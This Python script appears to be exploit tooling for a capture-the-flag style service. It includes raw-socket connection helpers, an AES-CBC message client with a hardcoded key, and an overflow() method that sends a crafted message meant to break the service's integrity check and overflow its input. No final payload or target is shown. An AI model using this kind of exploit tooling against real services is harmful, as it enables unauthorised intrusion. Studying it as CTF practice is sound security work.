#!/usr/bin/env python3
#coding: UTF-8

import re
import sys
import time
import struct
import socket
import select

from Crypto.Cipher import AES
from hashlib import sha1
from random import randrange


#
# Helper Functions
#
def e(s):
    return s.encode('ASCII')

def d(s):
    return s.decode('ASCII')

def p(d, fmt='<I'):
    return struct.pack(fmt, d)

def u(d, fmt='<I'):
    return struct.unpack(fmt, d)

def u1(d, fmt='<I'):
    return u(d, fmt)[0]

#
# Networking
#

# The default timeout (in seconds) to use for all operations that may raise an exception
DEFAULT_TIMEOUT = 5

# Custom exceptions raised by the Connection class
class ConnectionError(Exception):
    pass
class TimeoutError(ConnectionError):
    pass

class Connection:
    """Connection abstraction built on top of raw sockets."""

    def __init__(self, remote, local_port=0):
        self._socket = socket.create_connection(remote, DEFAULT_TIMEOUT, ('', local_port))

        # Disable kernel TCP buffering
        self._socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

    def __enter__(self):
        return self

    def __exit__(self, type, value, traceback):
        self.disconnect()

    def disconnect(self):
        """Shut down and close the socket."""
        try:
            # This will fail if the remote end reset the connection
            self._socket.shutdown(socket.SHUT_RDWR)
        except:
            pass
        self._socket.close()

    def recv(self, bufsize=4096, timeout=DEFAULT_TIMEOUT, dontraise=False):
        """Receive data from the remote end.

        If dontraise is True recv() will not raise a TimeoutError but instead return an empty string.
        """
        self._socket.settimeout(timeout)
        try:
            data = self._socket.recv(bufsize)
        except socket.timeout:
            if dontraise:
                return b''
            else:
                raise TimeoutError('timed out')

        # recv() returns an empty string if the remote end is closed
        if len(data) == 0:
            raise ConnectionError('remote end closed')

        return data

    def recvln(self, n=1, timeout=DEFAULT_TIMEOUT):
        """Receive lines from the remote end."""
        buf = b''

        while buf.count(b'\n') < n:
            # This maybe isn't great, but it's short and simple...
            buf += self.recv(1, timeout)

        return buf

    def recv_until_found(self, keywords, timeout=DEFAULT_TIMEOUT):
        """Receive incoming data until one of the provided keywords is found."""
        buf = b''

        while not any(True for kw in keywords if kw in buf):
            buf += self.recv(timeout=timeout)

        return buf

    def recv_until_match(self, regex, timeout=DEFAULT_TIMEOUT):
        """Receive incoming data until it matches the given regex."""
        if isinstance(regex, str):
            regex = re.compile(regex)
        buf = ''
        match = None

        while not match:
            buf += d(self.recv(timeout=timeout))
            match = regex.search(buf)

        return match

    def send(self, data):
        """Send all data to the remote end or raise an exception."""
        self._socket.sendall(data)

    def sendln(self, data):
        """Send all data to the remote end or raise an exception. Appends a \\n."""
        self.send(data + b'\n')

    def interact(self):
        """Interact with the remote end."""
        try:
            while True:
                print(d(self.recv(timeout=.05, dontraise=True)), end='')
                available, _, _ = select.select([sys.stdin], [], [], .05)
                if available:
                    data = sys.stdin.readline()
                    self.send(e(data))
        except KeyboardInterrupt:
            return


def connect(remote):
    """Factory function."""
    return Connection(remote)

# padding functions, this is just PKCS#7
def pad(msg):
    r = 16 - (len(msg) % 16)
    return msg + r * p(r, 'B')

def unpad(msg):
    r = msg[-1]
    return msg[:-r]


class Client:
    def __init__(self, c, iv):
        self.c = c
        self.iv = iv
        self.key = b'Elysium_Military'

    def recv_msg(self, timeout=DEFAULT_TIMEOUT):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        l = u1(self.c.recv(bufsize=4, timeout=timeout))

        msg = b''
        while len(msg) < l:
            msg += self.c.recv(l - len(msg))

        dec = aes.decrypt(msg)

        return unpad(dec)

    def send_msg(self, msg):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)

        sha = sha1(msg + b'\x00').hexdigest()
        pkg = pad(e(sha) + b':' + msg + b'\x00')
        enc = aes.encrypt(pkg)

        self.c.send(p(len(enc)))
        self.c.send(enc)

    def overflow(self, data, msg=b'pwn\n\x00'):
        aes = AES.new(self.key, AES.MODE_CBC, self.iv)

        payload = data + b':' + msg 
        sha = sha1(payload[1:]).hexdigest()
        pkg = pad(e(sha) + payload)
        enc = aes.encrypt(pkg)

        self.c.send(p(len(enc)))
        self.c.send(enc)

    def interact(self):
        while True:
            try:
                print(d(self.recv_msg(timeout=.05)))
            except TimeoutError:
                pass
            available, _, _ = select.select([sys.stdin], [], [], .05)
            if available:
                data = sys.stdin.readline()
                self.send_msg(e(data))

